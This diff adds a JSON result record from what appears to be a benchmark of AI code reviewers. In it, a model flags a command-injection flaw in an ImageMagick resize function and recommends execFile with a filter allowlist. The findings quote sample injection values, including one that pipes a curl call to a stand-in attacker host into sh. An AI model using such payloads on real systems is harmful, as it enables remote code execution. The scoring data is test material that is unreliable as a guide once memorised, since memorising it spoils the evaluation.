@@ -1,0 +1,108 @@
+{
+  "case": "C070",
+  "pr": "C070",
+  "repo": "fixture",
+  "provider": "grok",
+  "endpoint_kind": "xai",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "0c26652cd134",
+  "turns": 4,
+  "tool_calls": null,
+  "seconds": 67.6,
+  "setup_seconds": 0.0,
+  "total_seconds": 67.6,
+  "usage": {
+    "in": 18658,
+    "cache_read": 102784,
+    "cache_write": 0,
+    "out": 4078,
+    "source": "cli"
+  },
+  "cost_usd": 0.0926192,
+  "changed_files": [
+    "src/images/resize.ts"
+  ],
+  "findings": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity": "critical",
+      "body": "**Command injection:** replacing `execFile` with `exec` runs the command through a shell, and both `src` and `filter` are interpolated into that shell string without sanitization.\n\n**Failure mode:** a caller-controlled `filter` such as `Lanczos; curl http://attacker/$(whoami) | sh` (unquoted) or a `src` value like `x.png\\\"; id > /tmp/pwned; echo \\\"` executes arbitrary commands with the process privileges. The comment on line 4 makes the shell dependency explicit \u2014 filter expressions must never be a reason to enable `sh -c`.\n\n**Fix:** keep `execFile` / `spawn` with `shell: false` and pass arguments as an argv array; allowlist known ImageMagick filter names if users need to choose a filter:\n\n```suggestion\n    execFile(\"convert\", [src, \"-filter\", filter, \"-resize\", `${w}x`, \"/tmp/out.png\"], (e) => e ? rej(e) : res(\"/tmp/out.png\"));\n```\n\nAlso validate `filter` against an explicit allowlist (`Lanczos`, `Mitchell`, `Catrom`, \u2026) before invoking the binary, and keep `w` as a finite positive number so it cannot introduce shell metacharacters if the signature is ever widened again."
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 3,
+      "severity": "warning",
+      "body": "**Call-signature break:** `resize(src, w)` is now `resize(src, filter, w)`. Any existing caller that still passes the width as the second argument will bind a number to `filter` and leave `w` undefined, producing a broken `-filter` / `-resize` invocation (and under the new `exec` path, `undefined` stringifies into the shell command).\n\n**Fix:** if backward compatibility matters, add an overload or put `filter` last with a default (e.g. `filter = \"Lanczos\"`). If this is intentionally breaking, call it out in the PR and update all callers in the same change."
+    }
+  ],
+  "summary": "## Verdict\n\n**Do not merge** \u2014 this change introduces a critical command-injection vulnerability by switching from `execFile` to shell `exec` and interpolating caller-controlled strings into the command line.\n\n## Analysis\n\n`resize()` previously invoked ImageMagick via `execFile` with an argv array (no shell). The new code builds a single shell string:\n\n```ts\nexec(`convert \"${src}\" -filter ${filter} -resize ${w}x /tmp/out.png`, ...)\n```\n\nBoth `src` and `filter` are untrusted composition surfaces:\n\n- **`filter` is unquoted.** A value like `Lanczos; id > /tmp/pwned` (or any `$(...)` / backtick substitution) runs as a separate shell command on the runner/host.\n- **`src` is only double-quoted.** Values containing `\"`, backticks, or `$()` break out of the quoted path the same way.\n- The inline comment (\"needs a shell for the user-composed filter expressions\") documents intentional shell use for power-user expressions \u2014 that is exactly the wrong boundary for process spawning. ImageMagick filter names/expressions belong in an argv element passed to `execFile`/`spawn`, not in `sh -c`.\n\nThere is also a silent **call-signature break**: `resize(src, w)` becomes `resize(src, filter, w)`. Any existing caller still passing width as the second argument will send a number into `${filter}` and shift semantics. No in-repo callers showed up in search, but this is still a public export.\n\nPre-existing issues left unchanged (fixed `/tmp/out.png` output path shared-temp races) are out of diff scope and not filed inline.\n\n## Recommended fix\n\nKeep `execFile` (or `spawn` with `shell: false`). Pass `-filter` and the filter value as separate argv entries. Validate `filter` against an allowlist of ImageMagick filter names if the goal is power-user composition without a full expression language. Validate `w` as a finite positive number.\n\n**Recommendation:** request-changes",
+  "round": "full",
+  "effective_max_turns": 30,
+  "budget": {
+    "tier": "standard",
+    "profile": "fixed",
+    "turns": 30,
+    "alias": "balanced",
+    "model": "grok-4.5",
+    "output_tokens": 8192,
+    "verifier_warning_pct": 30,
+    "patch_bytes": 120000,
+    "native_cap_applied": false
+  },
+  "prior_finding_updates": {},
+  "prior_findings_kept": [],
+  "outstanding_verdicts": [],
+  "verification": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "The head code uses child_process.exec with a template string that interpolates unsanitized src and filter (filter unquoted), replacing the prior execFile argv form\u2014this is real shell command injection. Critical severity is appropriate."
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 3,
+      "severity_claimed": "warning",
+      "status": "skipped",
+      "reason": "not sampled"
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 1,
+    "seconds": 7.431,
+    "verified": 1,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 1,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 991,
+      "out": 326
+    },
+    "cost_usd": 0.00468
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C070-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
